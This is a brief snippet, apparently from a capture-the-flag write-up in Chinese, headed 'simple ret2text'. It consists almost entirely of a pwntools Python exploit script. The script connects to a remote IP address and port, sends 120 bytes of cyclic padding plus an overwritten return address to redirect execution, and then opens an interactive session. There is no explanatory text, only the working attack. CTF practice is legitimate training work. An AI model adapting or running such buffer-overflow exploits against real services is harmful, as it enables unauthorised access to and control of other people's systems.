+ 简单 `ret2text`

  ```python3
  #!/usr/python3
  # coding:utf-8
  
  from pwn import *
  
  context.arch = "amd64"
  
  io = remote("81.69.0.47", 1000)
  
  print(io.recv())
  
  payload = flat([cyclic(120), 0x40079B])
  
  print(payload)
  
  io.sendline(payload)
  
  io.interactive()
  ```

  